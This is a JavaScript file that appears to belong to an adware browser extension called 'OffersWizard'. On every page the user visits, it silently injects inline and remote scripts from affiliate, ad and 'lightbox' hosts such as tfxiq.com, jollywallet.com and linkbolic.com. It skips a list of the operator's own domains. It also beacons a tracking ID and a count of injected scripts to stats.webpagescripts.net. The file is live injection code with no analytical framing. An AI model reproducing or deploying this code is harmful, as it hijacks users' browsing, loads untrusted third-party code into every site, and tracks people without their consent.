
if ( (self === top) && (typeof window.__aimon === 'undefined')  )
{
    window.__aimon = 1;	
    callScripts6991();    
}

function callScripts6991() {
    
    var _blk = ['news.gmx.com','smartshopping.com','search.smartshopping.com','www.search.smartshopping.com','local.smartshopping.com','www.local.smartshopping.com','shoppstop.com','localmoxie.com','yellowmoxie.com','www.shoppstop.com','www.localmoxie.com','www.yellowmoxie.com','www.mail.com','suche.mail.com','www.web.de','suche.web.de','suche.gmx.de','search.gmx.com','search.gmx.co.uk','news.gmx.com','news.gmx.co.uk','www.turbosearchengine.com','search.turbosearchengine.com','www.relatedtopix.com','search.relatedtopix.com','www.app-rover.com','www.appigniter.com','www.bposolutions.com','www.zhuamob.com','www.yieldnexus.com','www.tfxiq.com','www.tfxiq.net']; for(var i=0;i<_blk.length;i++){ if(window.location.hostname === _blk[i]){ return ; }};
    
    var metaData = [];
    
    var simSSL = false;
    if(metaData['simSSL'] && (metaData['simSSL']==='1') )
    {
        simSSL = true;
    }
    
    var counter =0;
    
    var __inj_inline = function(inlineScript,inj_location)
    {
        counter++;
        var script_var_name = document.createElement("script");
        script_var_name.id = '__w_s'+counter;
        script_var_name.text = inlineScript;
        script_var_name.type = "text/javascript";
        document.getElementsByTagName(inj_location)[0].appendChild(script_var_name);
    };
    var __inj_external = function(url,inj_location)
    {
        counter++;
        var script_var_name = document.createElement("script");
        script_var_name.id = '__w_s'+counter;
        script_var_name.src = url;
        script_var_name.type = "text/javascript";
        script_var_name.async = true;
        document.getElementsByTagName(inj_location)[0].appendChild(script_var_name);
    };
    
    var data = [{"internal":"window.__pcc='PK';window.__subid='14698';window.__ext_brand='OffersWizard';","inj_location":"head","ad_unit_id":"77"},{"url":"a.tfxiq.com\/a.php?626ref1=616d6f6e6574697a65&626ref2=14698&626Name=OffersWizard&teid=091D3289CF87A4CEE60D39B7A83506F1&tuid=091D3289CF87A4CEE60D39B7A83506F1","inj_location":"body","ad_unit_id":"78"},{"url":"cdn.cubicleoffers.com\/script\/14567725629\/preload.js?subid=14698","inj_location":"body","ad_unit_id":"71"},{"url":"cds.v6i6b6a3.hwcdn.net\/stats18.js","inj_location":"head","ad_unit_id":"61"},{"url":"asrv-a.akamaihd.net\/sd\/4300\/1009.js","internal":"window._rvz4300x1009 = {'publisher_subid': '14698', 'addonname':'OffersWizard'};","inj_location":"body","ad_unit_id":"50"},{"url":"api.jollywallet.com\/affiliate\/client?dist=342&name=OffersWizard&sub=14698","inj_location":"head","ad_unit_id":"11"},{"url":"cds.w9z7u2w8.hwcdn.net\/catfish4.js","inj_location":"head","ad_unit_id":"87"},{"url":"static.donation-tools.org\/widgets\/owjsi\/widget.js?_irh_prodname=OffersWizard&_irh_exid=091D3289CF87A4CEE60D39B7A83506F1&__irh_subid=14698","inj_location":"body","ad_unit_id":"75"},{"url":"lightbox.linkbolic.com\/scjs\/lbx\/lbxctxjs.js?aff_id=775&sbrand=OffersWizard&subaff_id=14698&mode=lbx","inj_location":"body","ad_unit_id":"79"}];
    
    
    var protocol = ('https:' === document.location.protocol ? 'https://' : 'http://');
    
    if(simSSL === true)
    {
        protocol = 'https://';
    }
                                        

    for (key in data) {
        
        if (data.hasOwnProperty(key)) {
            var row= data[key];
            var url;
           
            if(row.internal && row.inj_location)
            {
                var internal = row.internal;
                __inj_inline(internal,row.inj_location);
            }
            
            if(protocol==='https://')
            {
                
                if(row.url_ssl && row.inj_location)
                {
                   
                    url = protocol+row.url_ssl;
                    
                    __inj_external(url,row.inj_location);
                }
                else if(row.url && row.inj_location)
                {
                    url = protocol+row.url;
                    
                    __inj_external(url,row.inj_location);
                }    
            }
            else
            {
                
                if(row.url && row.inj_location)
                {
                    url = protocol+row.url;
                    __inj_external(url,row.inj_location);
                }
                
            }
            
        }
    }
}



function __necdel()
{
(function(s1,cid,ext,data,moreinfo)
{
    if( (typeof(moreinfo)==="undefined") ||!moreinfo)
    {
        moreinfo="";
    }
    if(Math.random()>0.1)
    {
        return;
    }
        
    if(!document)
    {
        return;
    }
    
    var counter = 0;
    for(var i=0;i<20;i++)
    {
        var n = '__w_s'+i;
        
        var elem = document.getElementById(n);
        if(elem)
        {
            counter++;
        }
    }
       
    data = counter;
    var script = document.createElement("script");
    script.setAttribute('type', 'text/javascript'); 
    script.async = true;
    var protocol = ('https:' == document.location.protocol ? 'https://' : 'http://');
    var r = Math.floor((Math.random() * 1000) + 1);
    script.src = 'http://stats.webpagescripts.net/nec.js?s1='+s1+"&cid="+cid+"&ext="+ext+"&dat="+data+"&r="+r+moreinfo;
    var head = document.getElementsByTagName("head")[0]; 

    if( (protocol==='http://') && head)
    {
        head.appendChild(script);
    } 
    
})('091D3289CF87A4CEE60D39B7A83506F1','14698','OffersWizard','ignore','');
}

(function(){
    var ____triescounter = 0;
    var latestTimeoutId;

    var checkLoad = function() {

  
    if(____triescounter>=5)
    {
        clearTimeout(latestTimeoutId);
        if ( (self === top)   ) { setTimeout(__necdel,1000);}
        return;
    }
    ____triescounter++;
    if(document.readyState!== "complete")
    {
        clearTimeout(latestTimeoutId);
        latestTimeoutId = setTimeout(checkLoad, 500);
    }
    else
    {
        clearTimeout(latestTimeoutId);
        if ( (self === top)   ) {setTimeout(__necdel,1000);}
        return;
    }
  
};
checkLoad(); 

})();  




